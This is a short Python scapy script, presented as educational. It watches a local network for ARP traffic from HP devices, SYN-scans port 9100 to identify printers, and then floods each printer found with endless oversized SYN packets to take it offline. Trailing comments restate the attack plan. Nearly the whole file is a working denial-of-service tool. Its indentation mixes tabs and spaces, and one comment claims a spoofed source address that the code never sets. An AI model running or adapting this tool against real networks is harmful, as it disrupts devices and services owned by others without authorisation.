#!/usr/bin/python3
#this script is for educational purposes only!
#made by asher_epstein_42
from scapy.all import *

RAW_PRINTING_PORT = 9100 #this port is used for raw printing
 
def main():
	while True:
		#wait for arp attempt from hp device
		printer_possible_ip = wait_for_connection_attempt()
		#preferm stealth scan on port 9100 to see if this is a printer (9100 used for raw printing)
		if preferm_stealth_scan(printer_possible_ip,RAW_PRINTING_PORT) == True:
		#start dos attack (SYN Flooding Attack)
			dos_SYN_Flooding_Attack(printer_possible_ip)
			
			
#function to filter frames by the first half of the destination mac address(that determine that this is an hp #device -> 9C:7B:EF)
def filter_HP_device(frame):
	return ARP in frame and frame[Ether].src[0:8] == "9c:7b:ef" #Hewlett Packard(HP) mac address
def wait_for_connection_attempt():
	frames = sniff(count = 1, lfilter = filter_HP_device)

	return frames[0][ARP].psrc #ip address of the hp device

def preferm_stealth_scan(hp_device_ip,hp_device_port):
	stealth_scan_hp = sr1(IP(dst=hp_device_ip)/TCP(dport=hp_device_port,flags='S'),timeout=10)

	if(stealth_scan_hp.getlayer(TCP).flags == 0x12): #0x12 -> syn ack -> the port is open
		#send reset to complete the scan
        	send_rst = sr(IP(dst=hp_device_ip)/TCP(dport=hp_device_port,flags='R'),timeout=10)
        	return True
        
        return False
        
def dos_SYN_Flooding_Attack(dst_ip):
	hp_ip = IP(dst=dst_ip)
        #set src address to a spoofed random IP address in the private network range 
        hp_tcp = TCP(sport=RandShort(), dport=80, flags="S")
        hp_raw = Raw(b"X" * 10000) 
        dos_packet = hp_ip / hp_tcp / hp_raw
        send(dos_packet,loop=1, verbose=0)
	
	
if __name__ == "__main__":
    main()





#The porpose of this script is to check if someone is trying to connect to a HP printer over the network,
#and in case of detection -> perform a dos(denial of service) attack on the hp printer
# first, we are sniffing using scapy to check if an hp device is sending arp request, which is a good indication that someone is trying to connect to it.
# because you can't determine the type of the hp device by the mac address(only that this is a hp device
# - mac address of hp devices starts with 9C:7B:EF)
# we are going to preferm a stealth scan using our capturd destination IP address and port 9100 (raw ptinting) over tcp to see if we manage to get any response
# - there for this is a hp printer (because it uses raw printing protocol) .
# if it is a hp printer, were going to send a reset and start a dos attack(SYN Flooding Attack ).		
    
